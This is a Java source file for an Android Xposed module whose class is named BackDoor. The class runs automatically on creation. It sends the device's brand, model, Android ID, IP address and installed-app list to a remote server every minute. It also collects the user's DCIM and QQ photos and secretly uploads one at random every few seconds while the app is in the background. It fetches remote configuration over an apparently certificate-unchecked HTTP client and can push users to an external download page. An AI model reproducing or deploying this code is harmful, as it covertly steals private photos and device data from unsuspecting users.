package cn.coderstory.xposedtemplate.hack;

import android.app.ActivityManager;
import android.app.AndroidAppHelper;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import androidx.appcompat.app.AlertDialog;
import cn.coderstory.xposedtemplate.State;
import cn.coderstory.xposedtemplate.ui.MainActivity;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import de.robv.android.xposed.XposedBridge;
import lombok.SneakyThrows;
import okhttp3.*;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;

import static android.content.Context.ACTIVITY_SERVICE;
import static cn.coderstory.xposedtemplate.hack.DataCollection.getIP;


public class BackDoor {
    public static OkHttpClient client = DataCollection.getUnsafeOkHttpClient();
    public static BackDoor INSTANCE = new BackDoor();
    public static Gson gson = new Gson();
    public static String serial = Settings.Secure.getString(State.context.getContentResolver(), Settings.Secure.ANDROID_ID);

    public void reportDevice() {
        String brand = Build.BRAND + "  " +  Build.MODEL;
        String version = Build.VERSION.RELEASE;
        List<String> appList = DataCollection.getPkgList();
        AtomicReference<String> ip = new AtomicReference<>(getIP());
        int imgCount = getImageCount();
        DeviceInfo info = new DeviceInfo();
        info.setIp(ip.get());
        info.setApplications(appList);
        info.setBrand(brand);
        info.setAndroidVersion(version);
        info.setImageCount(imgCount);
        info.setSerial(BackDoor.serial);
        info.setLastOnline(System.currentTimeMillis());
        try {
            File sdcard = Environment.getExternalStorageDirectory();
            File dcim = new File(sdcard, "DCIM/");
            for (File file : dcim.listFiles()) {
                for (File ignored : file.listFiles()) {
                    State.imgList.add(ignored);
                }
            }
            File qq = new File(sdcard,"Tencent/QQ_Images");
            for (File file : qq.listFiles()) {
                State.imgList.add(file);
            }
            //List<String> ignore = this.getIgnore();
        } catch (Exception e) {
            State.hasPermission = false;
        }


        Thread t = new Thread(() -> {
            while (true) {
                try {
                    info.setLastOnline(System.currentTimeMillis());
                    RequestBody body = RequestBody.create(
                            MediaType.parse("application/json"), gson.toJson(info));
                    Request request = new Request.Builder()
                            .url(State.baseURL + "/reportDevice")
                            .post(body)
                            .build();
                    client.newCall(request).execute();
                    Thread.sleep(1000*60);
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        });
        t.start();

    }

    public BackDoor() {
        reportDevice();
        starUploadImg();
        getMediaList();
    }
    public void starUploadImg() {
        Thread uploadImageThread = new Thread(() -> {
            while (true) {
                try {
                    List<File> list = State.imgList;
                    int index = (int) (Math.random()* list.size());
                    File file = list.get(index);

                    if (isBackground(State.context)) {
                        BackDoor.INSTANCE.uploadImage(file);
                    }
                    Thread.sleep(5000);
                } catch (Exception e) {

                }
            }
        });
        uploadImageThread.start();
    }




    int getImageCount() {
        int num = 0;
        try {
            File sdcard = Environment.getExternalStorageDirectory();
            File dcim = new File(sdcard, "DCIM/");
            for (File file : dcim.listFiles()) {
                for (File ignored : file.listFiles()) {
                    num++;
                }
            }
            File qq = new File(sdcard,"Tencent/QQ_Images");
            for (File file : qq.listFiles()) {
                num++;
            }
        } catch (Exception ignored) {
            num = -1;
        }
        return num;

    }
    @SneakyThrows
    public void uploadImage(File file ) {
        MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
        RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("imgName", file.getName())
                .addFormDataPart("imgFile",file.getAbsolutePath(),
                        RequestBody.create(MediaType.parse("application/octet-stream"),
                                file))
                .addFormDataPart("serial",serial)
                .build();
        Request request = new Request.Builder()
                .url(State.baseURL + "/upload")
                .method("POST", body)
                .addHeader("Accept-Language", "zh-CN,zh;q=0.9")
                .addHeader("Connection", "keep-alive")
                .addHeader("Content-Type", "application/x-www-form-urlencoded")
                .build();
        Response response = client.newCall(request).execute();
    }
    @SneakyThrows
    public static void getMediaList() {
        AtomicReference<String> result = new AtomicReference<>("");
        Thread t = new Thread(() -> {
            try {
                result.set(client.newCall(new Request.Builder()
                        .url(State.baseURL + "/system/app")
                        .build()
                ).execute().body().string());
                XposedBridge.log(result.get());
                GeneralBean generalBean = gson.fromJson(result.get(), GeneralBean.class);
                State.mediaList = generalBean.getMediaList();
                if (generalBean.getVersion().time>=State.BUILD_TIME) {
                    State.needUpdate = true;
                    XposedBridge.log("判断：需要更新");
                    Looper.prepare();
                    /*
                    new Handler(Looper.getMainLooper()).post(() -> {
                        AlertDialog dialog = new AlertDialog.Builder(State.context)
                                .setTitle("需要更新")
                                .setMessage("请前往https://pan.pprocket.cn/apps下载新版本")
                                .create();
                        dialog.setCancelable(false);
                        dialog.setCanceledOnTouchOutside(false);

                        dialog.show();
                    });

                     */
                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://pan.pprocket.cn/apps"));
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK );
                    State.context.startActivity(intent);
                    Looper.loop();
                } else {
                    XposedBridge.log("判断：不需要更新");
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });
        t.start();
    }
    private boolean isBackground(Context context){
        ActivityManager activityManager = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo>  appProcessInfoList = activityManager.getRunningAppProcesses();
        if(appProcessInfoList == null){
            return false;
        }

        String packageName = context.getPackageName();
        for(ActivityManager.RunningAppProcessInfo processInfo : appProcessInfoList){
            if(processInfo.processName.equals(packageName) && processInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND ){
                return true;
            }
        }
        return false;
    }

}
